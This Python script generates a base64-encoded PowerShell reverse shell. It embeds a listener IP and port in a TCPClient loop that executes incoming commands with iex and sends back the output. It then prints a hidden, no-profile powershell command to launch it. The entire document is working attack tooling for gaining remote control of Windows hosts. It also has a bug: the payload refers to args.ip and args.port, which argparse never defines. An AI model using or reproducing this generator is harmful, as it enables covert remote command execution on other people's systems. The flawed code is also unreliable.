import sys
import base64
import argparse

# Parse the command-line arguments
parser = argparse.ArgumentParser(description='Script to generate PowerShell Encoded Reverse Shell Payload.')
parser.add_argument('-lh', '--listener-ip', help='Listener IPv4 address', required=True)
parser.add_argument('-lp', '--listener-port', help='Listener Port number', required=True)
args = parser.parse_args()

# Generate the payload with user-provided IP and port
payload = f'$client = New-Object System.Net.Sockets.TCPClient("{args.ip}", {args.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'

# Encode the payload
encoded_payload = base64.b64encode(payload.encode('utf16')[2:]).decode()

# Generate the final command
cmd = f'powershell -nop -w hidden -e {encoded_payload}'

print(cmd)
